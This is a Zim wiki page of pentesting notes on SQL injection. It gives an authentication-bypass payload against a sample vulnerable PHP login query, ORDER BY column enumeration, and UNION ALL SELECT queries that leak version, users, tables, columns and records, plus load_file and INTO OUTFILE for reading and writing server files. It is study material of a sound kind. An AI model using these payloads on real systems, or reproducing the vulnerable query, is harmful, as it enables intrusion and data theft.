Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-09-26T17:07:15-05:00

====== SQL Injection ======
Created Sunday 26 September 2021

===== Testing for SQLi =====

Add ' or " to input parameters of which you suspect they might be vulnerable to SQLi

===== Authentication bypass =====

Let's assume this very simple authentication scheme

{{{code: lang="php" linenumbers="False"
$query = "SELECT * FROM users where username = '$user' and password='$password';"
}}}


We can authenticate as the first user in the database by supplying 
{{{code: lang="php" linenumbers="False"
$user = "tom' or 1=1 LIMIT 1; #"
}}}


Which evaluates to

{{{code: lang="php" linenumbers="False"
$query = "SELECT * FROM users where username = 'tom' or 1=1 LIMIT 1;# ' and password='$password';"
}}}


===== Enumeration =====

==== Column enumeration ====

When you have an url of this format:
{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1
}}}

An it is vulnerable to SQLi,

append order by x until you get an error to determine the amount of column in the table
{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 1
}}}

{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 2
}}}

{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 3
}}}


If we have the amount of columns in the table, we can stick as UNION clause at the end to setup our enumeration.
The numer of parameters to the UNION ALL SELECT clause needs to be the same as the amount of columns
{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 3 UNION ALL SELECT 1,2,3
}}}


==== Information leaking ====
Following the above sequence of steps:
{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 3 UNION ALL SELECT 1,2,@@VERSION
}}}


| input                                                                  | output                                                                                                    |
|:-----------------------------------------------------------------------|:----------------------------------------------------------------------------------------------------------|
| @@VERSION                                                              | The Mysql server version                                                                                  |
| user()                                                                 | The user the query is run as                                                                              |
| database()                                                             | The current database                                                                                      |
| table_name from information_schema.tables                              | List of tables                                                                                            |
| column_name from information_schema.columns where table_name='<table>' | List of columns belonging to <table>                                                                      |
| load_file('<filename')                                                 | Contents of <filename>                                                                                    |
| "<content>" INTO OUTFILE "<filename>"                                  | Creates <filename> on filesystem, containing <content>   Needs FILE privilege + <filename> must not exist |

* Always do a @@version first.
* MySQL 4 does not have information_schema



Now that we have the columns belonging to a table, we can leak the records as such:
{{{code: lang="php" linenumbers="False"
http://vulserver/vulnpage?id=1 order by 3 UNION ALL SELECT 1,<colname_1>, <colname_2> FROM <table>
}}}


The amount of columns we can leak is determined by the amount of columns selected before the union.




